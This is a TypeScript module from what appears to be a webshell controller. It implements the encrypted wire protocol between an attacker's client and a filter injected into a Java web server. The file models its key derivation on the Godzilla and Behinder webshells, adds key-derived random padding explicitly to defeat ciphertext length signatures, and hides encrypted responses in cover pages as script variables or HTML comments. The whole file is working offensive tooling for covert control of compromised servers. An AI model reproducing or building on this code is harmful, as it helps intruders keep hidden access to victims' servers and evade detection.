/**
 * Mimic wire codecs — the selectable half of the mimic protocol.
 *
 * The site profile's `cipher` section picks how the ciphertext is produced
 * and hidden; every option is implemented twice, once here (TypeScript, used
 * by the client and the mock server) and once as a Java snippet in
 * src/custom/java-template.ts (compiled into the injected filter). The two
 * halves are pinned together by the cross-language tests in
 * src/custom/java-probe.test.ts — change one side and the other must follow.
 *
 * The pipeline is the same in both directions:
 *   encrypt: bytes -> cipher -> encoding -> padTail
 *   decrypt: strip padTail -> encoding^-1 -> cipher^-1
 *
 * A profile without a `cipher` section gets LEGACY_CIPHER, which is
 * byte-identical to the original mimic wire format — filters injected before
 * this menu existed keep working.
 */
import { createCipheriv, createDecipheriv, randomBytes } from "node:crypto";

import type { ProfileCipher } from "../core/site-profile.js";
import {
  aesEcbDecrypt,
  aesEcbEncrypt,
  base64UrlDecode,
  base64UrlEncode,
  md5Hex,
} from "./crypto.js";

export type CipherAlgorithm = NonNullable<ProfileCipher["algorithm"]>;
export type CipherEncoding = NonNullable<ProfileCipher["encoding"]>;
export type ResponseMarker = NonNullable<ProfileCipher["marker"]>;

export const CIPHER_ALGORITHMS: CipherAlgorithm[] = ["aes-ecb", "aes-cbc", "xor"];
export const CIPHER_ENCODINGS: CipherEncoding[] = ["base64", "base64url", "hex"];
export const RESPONSE_MARKERS: ResponseMarker[] = ["js-var", "html-comment"];

/** A fully-resolved cipher selection (every field present). */
export interface MimicCipher {
  algorithm: CipherAlgorithm;
  encoding: CipherEncoding;
  padTail: boolean;
  marker: ResponseMarker;
}

/** The original mimic wire format: AES/ECB + base64 + JS-variable marker. */
export const LEGACY_CIPHER: MimicCipher = {
  algorithm: "aes-ecb",
  encoding: "base64",
  padTail: false,
  marker: "js-var",
};

/** Fill the profile's partial `cipher` section with the legacy defaults. */
export function resolveCipher(partial?: ProfileCipher): MimicCipher {
  return { ...LEGACY_CIPHER, ...(partial ?? {}) };
}

// ---------- crypto ----------

function xorCrypt(data: Buffer, key: Buffer): Buffer {
  const out = Buffer.alloc(data.length);
  for (let i = 0; i < data.length; i++) out[i] = data[i]! ^ key[i % key.length]!;
  return out;
}

/**
 * Encrypt/decrypt raw bytes. `aesKey` is the 16-char md5-derived key (same
 * derivation as Godzilla). aes-cbc prepends a random 16-byte IV; xor cycles
 * the key bytes — both must stay in sync with the Java snippets.
 */
export function crypt(data: Buffer, aesKey: string, enc: boolean, algorithm: CipherAlgorithm): Buffer {
  switch (algorithm) {
    case "aes-ecb":
      return enc ? aesEcbEncrypt(data, aesKey) : aesEcbDecrypt(data, aesKey);
    case "aes-cbc": {
      const key = Buffer.from(aesKey, "utf8");
      if (enc) {
        const iv = randomBytes(16);
        const c = createCipheriv("aes-128-cbc", key, iv);
        return Buffer.concat([iv, c.update(data), c.final()]);
      }
      const d = createDecipheriv("aes-128-cbc", key, data.subarray(0, 16));
      return Buffer.concat([d.update(data.subarray(16)), d.final()]);
    }
    case "xor":
      return xorCrypt(data, Buffer.from(aesKey, "utf8"));
  }
}

// ---------- encoding ----------

function encodeBytes(data: Buffer, encoding: CipherEncoding): string {
  switch (encoding) {
    case "base64":
      return data.toString("base64");
    case "base64url":
      return base64UrlEncode(data);
    case "hex":
      return data.toString("hex");
  }
}

function decodeString(text: string, encoding: CipherEncoding): Buffer {
  switch (encoding) {
    case "base64":
      return Buffer.from(text, "base64");
    case "base64url":
      return base64UrlDecode(text);
    case "hex":
      return Buffer.from(text, "hex");
  }
}

// ---------- padTail ----------

/**
 * Length of the random-garbage tail, derived from the key so both sides
 * compute it identically (0-15). Behinder's `aes_with_magic` transport uses
 * the same trick: appending junk of a key-derived length breaks the fixed
 * length signature of the ciphertext.
 */
export function padTailLength(aesKey: string): number {
  return Number.parseInt(md5Hex(aesKey).slice(0, 2), 16) % 16;
}

/** Alnum only — the padded value must stay legal in query strings and headers. */
const PAD_ALPHABET = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";

function appendPad(text: string, aesKey: string): string {
  const n = padTailLength(aesKey);
  if (n === 0) return text;
  const raw = randomBytes(n);
  let tail = "";
  for (let i = 0; i < n; i++) tail += PAD_ALPHABET[raw[i]! % PAD_ALPHABET.length];
  return text + tail;
}

function stripPad(text: string, aesKey: string): string {
  const n = padTailLength(aesKey);
  return n === 0 ? text : text.slice(0, Math.max(0, text.length - n));
}

// ---------- field transforms (requests and responses both ride these) ----------

/** plaintext -> ciphertext as it appears on the wire. */
export function encryptField(
  plaintext: Buffer,
  aesKey: string,
  cipher: MimicCipher = LEGACY_CIPHER,
): string {
  let out = encodeBytes(crypt(plaintext, aesKey, true, cipher.algorithm), cipher.encoding);
  if (cipher.padTail) out = appendPad(out, aesKey);
  return out;
}

/** wire value -> plaintext. Throws on garbage (wrong key / not our traffic). */
export function decryptField(
  value: string,
  aesKey: string,
  cipher: MimicCipher = LEGACY_CIPHER,
): Buffer {
  let text = value;
  if (cipher.padTail) text = stripPad(text, aesKey);
  return crypt(decodeString(text, cipher.encoding), aesKey, false, cipher.algorithm);
}

// ---------- response markers ----------

export interface ResponseMarkers {
  /** Left delimiter of the ciphertext inside the cover page. */
  left: string;
  /** Right delimiter of the ciphertext. */
  right: string;
  /** Wrap the ciphertext into the fragment injected into the cover page. */
  wrap(payload: string): string;
}

/**
 * Per-shell response markers. The 5-hex digest of pass+key keeps every
 * shell's delimiters unique; the style selects how the fragment hides in the
 * cover page (a JS assignment vs an HTML comment).
 */
export function deriveMarkers(
  pass: string,
  secretKey: string,
  cipher: MimicCipher = LEGACY_CIPHER,
): ResponseMarkers {
  const id = md5Hex(pass + secretKey).slice(0, 5);
  if (cipher.marker === "html-comment") {
    const left = `<!--Re${id}_config:`;
    return { left, right: "-->", wrap: (p) => `${left}${p}-->` };
  }
  const left = `var Re${id}_config="`;
  return { left, right: '";', wrap: (p) => `<script>${left}${p}";</script>` };
}
